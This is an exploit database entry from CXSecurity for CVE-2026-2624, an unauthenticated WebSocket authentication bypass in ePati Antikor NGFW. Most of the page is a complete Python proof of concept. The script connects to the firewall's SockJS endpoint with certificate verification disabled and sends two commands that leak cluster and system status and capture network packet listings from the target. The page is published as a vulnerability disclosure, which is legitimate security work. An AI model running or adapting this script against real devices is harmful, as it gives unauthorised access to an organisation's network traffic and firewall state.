---
title: ePati Antikor NGFW 2.0.1301  Authentication Bypass
url: https://cxsecurity.com/issue/WLB-2026050024
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-27
fetch_date: 2026-05-28T06:01:03.818824
---

# ePati Antikor NGFW 2.0.1301  Authentication Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ePati Antikor NGFW 2.0.1301 Authentication Bypass** **2026.05.27**  Credit:  **[SADIK ERTÜRK](https://cxsecurity.com/author/SADIK%2BERT%C3%9CRK/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-2624](https://cxsecurity.com/cveshow/CVE-2026-2624/ "Click to see CVE-2026-2624")**  CWE: **N/A** | |

# Exploit Title: ePati Antikor NGFW 2.0.1301 - Authentication Bypass
# Date: 2026-04-13
# Exploit Author: [SADIK ERTÜRK]
# Vendor Homepage: https://www.epati.com.tr/
# Software Link: https://www.epati.com.tr/antikor-ngfw/
# Version: v.2.0.1298 - v.2.0.1301
# Tested on: Linux / Antikor OS
# CVE: CVE-2026-2624
import websocket
import json
import ssl
import sys
import argparse
import random
import string
import time
def banner():
print("-" \* 65)
print(" ePati Antikor NGFW Unauthenticated WebSocket Exploit")
print(" CVE-2026-2624 | Author: [SADIK ERTÜRK]")
print("-" \* 65)
def generate\_random\_id(length=8):
"""Generates a random session ID for the SockJS connection."""
return ''.join(random.choices(string.ascii\_lowercase + string.digits, k=length))
def exploit(target\_ip, target\_port):
# Generating random server and session IDs for SockJS
server\_id = random.randint(100, 999)
session\_id = generate\_random\_id()
ws\_url = f"wss://{target\_ip}:{target\_port}/sock/{server\_id}/{session\_id}/websocket"
print(f"[\*] Target WebSocket URL created: {ws\_url}")
print("[\*] Connecting to the target... (Ignoring SSL certificate warnings)")
try:
# Bypassing Self-Signed SSL certificate verifications
ws = websocket.WebSocket(sslopt={"cert\_reqs": ssl.CERT\_NONE})
ws.connect(ws\_url)
print("[+] Connection Successful! (Authentication bypassed)\n")
# Payload 1: Listening to Cluster and System Status
payload\_1 = json.dumps(["{\"istekId\":\"req\_init\_01\",\"komut\":\"rapor-dinle\",\"parametreler\":[\"cluster-durum\"]}"])
print("[\*] Sending 1st payload: 'rapor-dinle' (cluster-status)...")
ws.send(payload\_1)
# Wait for the response from the server
time.sleep(1)
response\_1 = ws.recv()
if response\_1:
print("[+] SUCCESSFUL! Sensitive system data successfully leaked:")
print(f"> {response\_1}\n")
# Payload 2: Listening to Network Packets
payload\_2 = json.dumps(["{\"istekId\":\"req\_101\",\"komut\":\"paket-liste-dinle\",\"parametreler\":[]}"])
print("[\*] Sending 2nd payload: 'paket-liste-dinle' (network-packet-list)...")
ws.send(payload\_2)
time.sleep(1)
response\_2 = ws.recv()
if response\_2:
print("[+] Network packet data captured:")
print(f"> {response\_2}\n")
print("[\*] Exploitation complete. Closing connection.")
ws.close()
except websocket.WebSocketException as e:
print(f"[-] WebSocket Error: {e}")
print("[-] The target might be patched (v.2.0.1302+) or the port is closed.")
sys.exit(1)
except Exception as e:
print(f"[-] An unexpected error occurred: {e}")
sys.exit(1)
if \_\_name\_\_ == "\_\_main\_\_":
banner()
# Argument parsing
parser = argparse.ArgumentParser(description="ePati Antikor NGFW WebSocket Auth Bypass PoC")
parser.add\_argument("-t", "--target", required=True, help="Target IP or Hostname (e.g., 192.168.1.10)")
parser.add\_argument("-p", "--port", default="8800", help="Target Port (Default: 8800)")
args = parser.parse\_args()
exploit(args.target, args.port)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026050024)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top